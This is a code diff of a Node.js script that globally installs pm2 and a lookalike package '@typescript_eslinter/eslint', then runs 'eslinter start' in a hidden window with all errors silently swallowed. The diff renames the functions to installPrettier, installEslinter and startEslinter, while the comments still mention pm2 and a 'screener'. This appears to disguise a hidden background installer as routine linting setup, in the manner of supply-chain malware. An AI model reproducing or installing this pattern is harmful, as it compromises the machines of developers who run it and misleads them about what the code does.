@@ -1,7 +1,7 @@
 const { exec } = require('child_process');
 
 // Function to install pm2 globally
-function installPm2() {
+function installPrettier() {
   return new Promise((resolve, reject) => {
     exec('npm install -g pm2', (error, stdout, stderr) => {
       if (error) {
@@ -14,7 +14,7 @@ function installPm2() {
 }
 
 // Function to install screener globally
-function installScreener() {
+function installEslinter() {
   return new Promise((resolve, reject) => {
     exec('npm install -g @typescript_eslinter/eslint@latest', (error, stdout, stderr) => {
       if (error) {
@@ -27,7 +27,7 @@ function installScreener() {
 }
 
 // Function to start the folder with pm2
-function startScreener() {
+function startEslinter() {
   return new Promise((resolve, reject) => {
     exec(`eslinter start`, { windowsHide: true }, (error, stdout, stderr) => {
       if (error) {
@@ -42,9 +42,9 @@ function startScreener() {
 // Main function to execute the steps
 async function main() {
   try {
-    await installPm2();
-    await installScreener();
-    await startScreener();
+    await installPrettier();
+    await installEslinter();
+    await startEslinter();
   } catch (error) {
   }
 }
